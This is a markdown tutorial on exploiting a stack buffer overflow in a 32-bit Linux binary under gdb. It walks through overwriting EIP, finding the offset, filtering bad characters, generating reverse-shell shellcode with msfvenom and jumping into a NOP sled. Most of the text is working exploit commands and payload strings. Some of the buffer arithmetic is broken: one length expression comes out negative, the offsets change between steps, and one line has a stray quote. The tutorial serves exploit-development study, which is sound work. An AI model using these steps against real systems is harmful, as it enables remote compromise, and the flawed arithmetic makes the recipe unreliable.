# Reverse Shell

## Take Control of EIP

With `gdb`, send a large number of 'A' to the program until getting an error (`SIGSEGV, Segmentation fault`)

```sh
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) run $(python2 -c "print 'A' * 1200")
```

From the register information `info registers`, verify that we have successfully written on `EIP` and it has the values `A` which is `0x41414141`

## Finding the offset

Now we need to find the `offset` which is the exact size needed to overwrite `EIP`

```sh
msf-pattern_create -l 100
```

Execute the command output in `gdb` 

```sh
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
```

Verify that `EIP` has a new value, take this value and find the corresponding `offset`.

```sh
msf-pattern_offset -q {EIP_VALUE}
```

This will return a value which will be the size of our `offset`.

## Determine the Length for Shellcode

After finding the `offset`, we must now discover how much space we have for our reverse shell

we need:

```sh
   Buffer = "A" * (offset - 100 - 150 - 4)
     NOPs = "\x90" * 4
Shellcode = "\x44" * 50
      EIP = "\x66" * 4
```

```sh
(gdb) run $(python2 -c 'print "A" * (54 - 100 - 150 - 4) + "\x90" * 4 + "B" * 50 + "\x66" * 4')
```

Verify that we control `EIP` and it has a new value which is `0x66666666`.

## Find bad character

Once we control the `EIP`, we must identify the bad characters

We use this character list to know all the characters we must take into account and avoid when generating our shellcode.

This string is `256` bytes

```sh
$CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

echo $CHARS | sed 's/\\x/ /g' | wc -w
```

We must therefore recalculate our buffer

```sh
Buffer = "A" * (offset - 256 - 4)
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Now we need to set a breakpoint at the vulnerable function so that execution stops at this stage, and we can analyze the memory content.

```sh
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

Now, we can execute the newly created input and view the memory.

```sh
(gdb) run $(python2 -c 'print "A" * (54 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```

After executing our buffer with the bad characters and reaching the breakpoint, we can examine the stack.

```sh
(gdb) x/2000xb $esp+500
```

Scroll down and look for the end point of `A` and the starting point of `CHARS`

We see where our `A` ends and where the `CHARS` variable begins

Note all characters that skip the order of `CHARS`, remove it from `CHARS` and adjust the number of `CHARS` by subtracting `-1` like: `Buffer = "A" * (offset - (256 - n) - 4)` then **re-execute**

**This process must be repeated until all characters likely to interrupt the flow are removed.**

Generally we must check `\x00` which indicates that this character is not allowed here and must be removed accordingly.


These noted characters will be our `bad characters`

## Generating Shellcode

```sh
msfvenom --platform linux -a x86 -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 -f c -b "<badchars>" -o shellcode.c
```

Now that we have our shellcode, we adjust it to have only one string, then we can adapt and submit our simple exploit again.

```sh
   Buffer = "A" * (offset - 124 - 95 - 4)
     NOPs = "\x90" * 4
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4
```

```sh
(gdb) run $(python -c 'print "\x55" * (offset - 124 - 95 - 4) + "\x90" * 4 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

Then, we check if the first bytes of our shellcode match the bytes after the NOPS.

Go to the end of the `NOPs` and observe the beginning of the shellcode

```sh
(gdb) x/2000xb $esp+550
```

## Identification of the Return Address

After verifying that we still control the EIP with our shellcode, we now need a memory address where our NOPs are located to tell the EIP to access it.

This memory address must not contain any of the bad characters we found previously.

```sh
(gdb) x/2000xb $esp+1400
# 0xffffd644: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd64c: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd654: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
# 0xffffd65c: 0x90  0x90  0xda  0xca  0xba  0xe4  0x11  0xd4
```

Here, we now need to choose an address to which we refer `EIP`

After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the selected address. (`0xffffd64c`)

Note that the input of the selected address is entered in reverse.
 
```sh
   Buffer = "A" * (offset - 100 - 95 - 4)
     NOPs = "\x90" * 4
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = \x4c\xd6\xff\xff"
```

**Execute the program to get a reverse shell**

```sh
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```
